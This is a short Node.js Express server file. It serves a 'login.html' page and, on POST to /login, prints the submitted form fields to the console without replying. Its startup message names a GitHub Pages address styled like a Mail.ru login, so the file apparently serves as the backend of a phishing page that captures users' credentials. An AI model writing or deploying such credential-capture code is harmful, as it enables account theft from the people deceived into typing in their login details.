const express = require('express')
const bodyParser = require('body-parser')
const app = express()

const PORT = 3001
app.use(bodyParser.urlencoded({ extended: false }))
app.post('/login', (req, res) => {
    console.log(req.body)
})
app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/login.html')
})

app.listen(PORT, () => console.log('server listening at https://mailru1231.github.io/1/login'))
